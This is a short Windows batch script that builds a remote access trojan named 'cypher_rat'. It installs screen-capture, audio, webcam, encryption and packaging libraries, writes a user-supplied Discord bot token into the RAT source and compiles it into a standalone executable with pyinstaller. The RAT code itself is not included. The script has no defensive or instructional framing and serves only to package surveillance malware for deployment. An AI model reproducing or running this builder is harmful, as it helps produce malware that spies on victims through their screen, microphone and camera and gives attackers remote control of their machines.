@echo off

pip install discord.py psutil pyautogui pyaudio opencv-python pycryptodome imageio pyinstaller

pause

set /p user_input=Enter the token:
echo TOKEN = '%user_input%' >> cypher_rat.py
echo bot.run(TOKEN) >> cypher_rat.py

pyinstaller --onefile cypher_rat.py
